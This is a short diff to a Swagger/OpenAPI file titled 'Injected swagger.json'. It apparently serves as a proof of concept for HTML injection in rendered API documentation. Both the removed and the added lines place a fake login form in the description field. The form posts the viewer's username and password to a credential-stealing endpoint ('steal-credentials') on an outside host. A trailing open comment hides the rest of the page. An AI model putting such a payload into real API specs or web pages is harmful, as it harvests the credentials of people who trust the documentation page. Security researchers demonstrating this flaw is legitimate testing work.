@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Injected swagger.json
   description: |
-    <form action="http://malicious-website.com/steal-credentials" method="post"><label for="username">Username:</label><input type="text" id="username" name="username"><br><label for="password">Password:</label><input type="password" id="password" name="password"><br><input type="submit" value="Log In"></form><!--
+    <h2 class="title">Platform's API</h2><br/><p>This specification describes the Platform's API. To interact with them, you need to log in using the form below.<br/></p><form action="https://intigriti/steal-credentials" method="post"><label for="username">Username:</label><input type="text" id="username" name="username"><br><label for="password">Password:</label><input type="password" id="password" name="password"><br><input type="submit" value="Log In"></form><!--
 paths:
   /accounts:
     get:
